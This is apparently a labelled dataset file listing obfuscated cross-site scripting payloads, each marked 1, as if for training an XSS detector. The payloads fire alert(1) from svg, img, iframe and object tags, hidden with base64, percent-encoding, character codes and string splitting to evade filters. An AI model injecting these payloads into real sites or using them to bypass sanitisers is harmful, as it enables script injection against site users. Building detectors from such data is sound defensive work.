"<iframe srcdoc=""<svg onload=setTimeout('ale'+'rt(1)',0)>""></iframe>",1
<svg onload=eval(atob('YWxlcnQoMSk='))>,1
<svg onload=eval(decodeURIComponent('%61%6c%65%72%74(1)'))>,1
"<iframe srcdoc=""<img src=x onerror=setTimeout(`ale`+'rt(1)',0)>""></iframe>",1
"<svg onload=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",1
<svg onload=eval(`\\u0061\\u006c\\u0065\\u0072\\u0074(1)`)>,1
<svg onload=window[atob('YWxlcnQ=')](1)>,1
<img src=x onerror=window[atob('YWxlcnQ=')](1)>,1
"<object data=""data:text/html,<svg onload=window['al'+'ert'](1)></svg>""></object>",1
"<svg onload=setTimeout(`al${String.fromCharCode(101,114,116)}(1)`,0)>",1
"<img src=x onerror=""setTimeout('ale'+'rt(1)',0)"">",1
"<iframe srcdoc=""<svg onload=eval(decodeURIComponent('%61%6C%65%72%74(1)'))>""></iframe>",1
"<iframe srcdoc=""<img src=x onerror=eval(`\\u0061\\u006c\\u0065\\u0072\\u0074(1)`)>""></iframe>",1
"<object data=""data:text/html,<img src=x onerror=eval('al'+'ert(1)')>""></object>",1
<svg onload=eval(decodeURIComponent('%61%6C%65%72%74(1)'))>,1
"<iframe srcdoc=""<svg onload=eval(atob('YWxlcnQoMSk='))>""></iframe>",1
<svg onload=Function(atob('cmV0dXJuIGFsZXJ0'))()(1)>,1
"<svg onload=setInterval('al'+'ert(1)',0)>",1
"<img src=x onerror=setTimeout(decodeURIComponent('%61%6C%65%72%74(1)'),0)>",1
"<iframe srcdoc=""<img src=x onerror=setTimeout(decodeURIComponent('%61%6C%65%72%74(1)'),0)>""></iframe>",1
"<object data=""data:text/html,<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>""></object>",1
"<svg onload=setTimeout(atob('YWxlcnQoMSk='),0)>",1
"<iframe srcdoc=""<svg onload=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>""></iframe>",1
<img src=x onerror=eval(atob('YWxlcnQoMSk='))>,1
